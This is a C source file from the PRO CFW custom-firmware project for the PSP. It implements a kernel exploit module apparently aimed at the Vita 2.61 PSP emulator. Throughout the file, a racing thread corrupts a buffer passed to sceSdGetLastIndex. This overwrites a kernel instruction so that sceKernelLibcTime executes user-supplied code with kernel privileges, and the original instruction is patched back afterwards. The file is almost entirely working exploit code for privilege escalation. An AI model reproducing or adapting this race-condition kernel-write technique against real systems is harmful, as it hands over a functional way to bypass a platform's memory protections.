/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <module2.h>
#include <lflash0.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"
#include "functions.h"

FunctionTable* g_tbl = NULL;

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

unsigned int (* _sceKernelCpuSuspendIntr)() = (void*)NULL;
void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;

int (* _sceUtilitySavedataGetStatus)() = (void*)NULL;
int (* _sceUtilitySavedataInitStart)(SceUtilitySavedataParam *params) = (void*)NULL;
void (* _sceUtilitySavedataUpdate)(int a0) = (void*)NULL;
int (* _sceUtilitySavedataShutdownStart)() = (void*)NULL;

u32 packet[256], address = 0x8800F71C, is_exploited;

void p5_open_savedata(int mode)
{
	SceUtilitySavedataParam dialog;

	memset(&dialog, 0, sizeof(SceUtilitySavedataParam));
	dialog.base.size = sizeof(SceUtilitySavedataParam);

	dialog.base.language = 1;
	dialog.base.buttonSwap = 1;
	dialog.base.graphicsThread = 0x11;
	dialog.base.accessThread = 0x13;
	dialog.base.fontThread = 0x12;
	dialog.base.soundThread = 0x10;

	dialog.mode = mode;

	_sceUtilitySavedataInitStart(&dialog);

	// Wait for the dialog to initialize
	while (_sceUtilitySavedataGetStatus() < 2)
	{
		g_tbl->KernelDelayThread(100);
	}
}

// Runs the savedata dialog loop
void p5_close_savedata()
{

	int running = 1;
	int last_status = -1;

	while(running) 
	{
		int status = _sceUtilitySavedataGetStatus();
		
		if (status != last_status)
		{
			last_status = status;
		}

		switch(status) 
		{
			case PSP_UTILITY_DIALOG_VISIBLE:
				_sceUtilitySavedataUpdate(1);
				break;

			case PSP_UTILITY_DIALOG_QUIT:
				_sceUtilitySavedataShutdownStart();
				break;

			case PSP_UTILITY_DIALOG_NONE:
				running = 0;
				break;

			case PSP_UTILITY_DIALOG_FINISHED:
				break;
		}
		g_tbl->KernelDelayThread(100);
	}
}

void executeKernel(u32 kernelContentFunction)
{
	_sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);

}

void repairInstruction(void){
	//Vita 2.61
	_sw(0x8C654384, 0x8800F71C); // recover the damage we've done
}

void KernelFunction()
{
	is_exploited = 1;
}

int stubScanner(FunctionTable* tbl){

	g_tbl = tbl;

	// thread and interrupt functions
	_sceKernelCpuSuspendIntr = (void*)g_tbl->FindImportUserRam("Kernel_Library", 0x092968F4);
	_sceKernelCpuResumeIntr = (void*)g_tbl->FindImportUserRam("Kernel_Library", 0x5F10D406);

	// savedata functions
	_sceUtilitySavedataGetStatus = (void*)g_tbl->FindImportUserRam("sceUtility", 0x8874DBE0);
	_sceUtilitySavedataInitStart = (void*)g_tbl->FindImportUserRam("sceUtility", 0x50C4CD57);
	_sceUtilitySavedataUpdate = (void*)g_tbl->FindImportUserRam("sceUtility", 0xD4B95FFB);
	_sceUtilitySavedataShutdownStart = (void*)g_tbl->FindImportUserRam("sceUtility", 0x9790B33C);

	p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);

	g_tbl->KernelDcacheWritebackAll();

	// vulnerable function
	_sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
	// the function we need to patch
	_sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

	return 0;
}

int doExploit()
{
	is_exploited = 0;

	// the threads that will make sceSdGetLastIndex vulnerable
	int qwik_thread()
	{
		while (is_exploited != 1) {
			packet[9] = (u32)address - 18 - (u32)&packet;
			g_tbl->KernelDelayThread(0);
		}

		return 0;
	}

	// we create the thread and constantly attempt the exploit
	SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);;
	g_tbl->KernelStartThread(qwikthread, 0, NULL);

	while (is_exploited != 1) {
		packet[9] = (u32)16;
		_sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
		g_tbl->KernelDelayThread(0);
		_sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
		g_tbl->KernelDcacheWritebackAll();
	}

	p5_close_savedata();

	return 0;

}

void initKxploit(KxploitFunctions* kf)__attribute__((section(".text.startup")));
void initKxploit(KxploitFunctions* kf){
	kf->stubScanner = &stubScanner;
	kf->doExploit = &doExploit;
	kf->executeKernel = &executeKernel;
	kf->repairInstruction = &repairInstruction;
}
